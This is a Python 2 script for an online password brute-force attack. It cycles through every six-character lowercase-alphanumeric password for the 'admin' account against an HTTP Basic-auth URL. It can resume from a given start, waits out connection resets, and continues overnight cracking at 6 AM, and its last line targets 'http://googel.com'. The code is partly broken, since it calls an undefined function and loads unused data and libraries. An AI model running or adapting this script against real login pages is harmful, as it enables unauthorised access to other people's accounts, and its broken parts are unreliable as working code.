import matplotlib
import numpy
import pandas
import scipy
import socket
import urllib2, base64
import sys
import time


def brute_force(password_start, url):

    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    request = urllib2.Request(url)
    num = len(charset)**3
    print "Trying to crack %s" %(url)
	
    pwd = pandas.read_csv("password.csv",parse_dates=['date'])

    totspeed = 0
    c = 0
    total = 36**6

    first_time = True

    ilist = []
    for i in password_start:
        for index, j in enumerate(charset):
            if i == j:
                ilist.append(index)

    usrname = 'admin'

    for idx, l in enumerate(charset):
        _q = idx
        if idx < ilist[0] and first_time:
            continue
        for idx2, m in enumerate(charset):
            _w = idx2
            if idx2 < ilist[1] and first_time:
                continue
            for idx3, n in enumerate(charset):
                _e = idx3
                if idx3 < ilist[2] and first_time:
                    continue
                at = time.time()
                for idx4,o in enumerate(charset):
                    if idx4 < ilist[3] and first_time:
                        continue
                    for idx5, p in enumerate(charset):
                        if idx5 < ilist[4] and first_time:
                            continue
                        for idx6, q in enumerate(charset):
                            if idx6 < ilist[5] and first_time:
                                continue

                            #PASSWORD
                            passwd = l+m+n+o+p+q
                            first_time = False

                            #LOGGING IN
                            base64string = base64.encodestring('%s:%s' % (usrname,passwd)).replace('\n', '')
                            request.add_header("Authorization", "Basic %s" % base64string)
                            try:
                                result = urllib2.urlopen(request)
                                print "Login succes!!  Username: %s"%usrname,"   Password: %s"%passwd
                                sys.exit()

                            #EVERY FAILED PASSWORD GOES IN HERE
                            except urllib2.HTTPError:
                                continue

                            #IF A NETWORK ERROR OCCURS, IT WILL BE CAUGHT WITH AN EXCEPTION
                            except socket.error:
                                print "\n Sleeping for a moment. Conncection is reset by peer...\n"
                                time.sleep(60)
                                afunction(passwd)


                            except urllib2.URLError:
                                if time.localtime()[3] < 21:
                                    print "Connection has been lost. Try again in 10 minutes"
                                    start3 = passwd
                                    time.sleep(600)
                                    afunction(passwd)

                                else:
                                    start3 = passwd
                                    print "Connection has been terminated at: %s\n"% time.ctime()
                                    print "Todays cracking ended with: %s"%start3
                                    print "Cracking will continue at 6 AM\n"
                                    while time.localtime()[3] != 6:
                                        time.sleep(600)
                                    time.sleep(300)
                                    afunction(passwd)

                #STATUS UPDATE
                bt = time.time()

                totpasswd = num/((bt-at))
                totspeed +=int(totpasswd)
                c+=1
                average = totspeed / c
                aa = (36-(_q+1) )
                bb = (36-(_w+1) )
                cc = (36-(_e+1) )
                if aa == 0: aa = 1
                if bb == 0: bb = 1
                if cc == 0: cc = 1
                passwordsleft = ( aa * 36**5) +( bb * 36**4) + ( cc * 36**3) + (36**3) + (36**2) + 36.
                estimatation = ((passwordsleft/average) / 3600 ) / 13.
                print usrname,"::::",l+m+n+'xxx',"::::", "  Processed %d passwords / sec"%totpasswd, "::::","  Estimated time left: %d days"%estimatation,"::::","  Passwords Left: %d"%passwordsleft, "::::","  Done: %.2f %%"%((passwordsleft/total)*100)


brute_force('startf', 'http://googel.com')